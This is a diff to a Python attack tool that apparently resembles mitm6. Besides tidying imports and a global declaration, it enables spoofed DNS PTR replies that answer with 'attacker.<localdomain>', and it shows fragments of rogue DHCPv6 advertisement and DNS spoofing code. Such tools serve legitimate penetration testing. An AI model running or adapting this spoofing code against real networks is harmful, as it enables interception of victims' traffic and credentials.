@@ -12,8 +12,7 @@ from scapy.all import sniff, ls, ARP, IPv6, DNS, DNSRR, Ether, IP, UDP
 from scapy.layers.dhcp6 import *
 from scapy.layers.inet6 import ICMPv6ND_RA
 from scapy.sendrecv import sendp
-from twisted.internet import reactor
-from twisted.internet import task, threads
+from twisted.internet import task, threads, reactor
 from twisted.internet.protocol import DatagramProtocol
 
 # Globals
@@ -125,7 +124,6 @@ def get_fqdn(dhcp6packet):
 
 
 def send_dhcp_advertise(p, basep, target):
-    global ipv6noaddrc
     resp = Ether(dst=basep.src) / IPv6(src=config.selfaddr, dst=basep[IPv6].src) / UDP(sport=547,
                                                                                        dport=546)  # base packet
     resp /= DHCP6_Advertise(trid=p.trid)
@@ -188,12 +186,12 @@ def send_dns_reply(p):
     elif dns.qd.qtype == 12:
         # To reply for PTR requests for our own hostname
         # comment the return statement
-        return
         if reqname == config.selfptr:
             # We reply with attacker.domain
             rdata = 'attacker.%s' % config.localdomain
         else:
             return
+
     # Not handled
     else:
         return
